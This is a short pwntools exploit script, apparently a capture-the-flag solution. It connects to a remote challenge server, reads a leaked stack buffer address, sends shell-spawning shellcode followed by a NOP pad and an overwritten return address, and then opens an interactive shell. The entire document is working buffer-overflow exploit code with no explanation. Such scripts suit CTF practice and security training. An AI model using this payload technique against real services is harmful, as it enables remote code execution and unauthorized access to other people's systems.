from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3005)

p.recvuntil('buf: ')
buf = int(p.recv(14),16)

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

payload = ''
payload += shellcode
payload += '\x90'*(0x6d38-len(shellcode))
payload += p64(buf)

p.sendline(payload)
p.interactive()
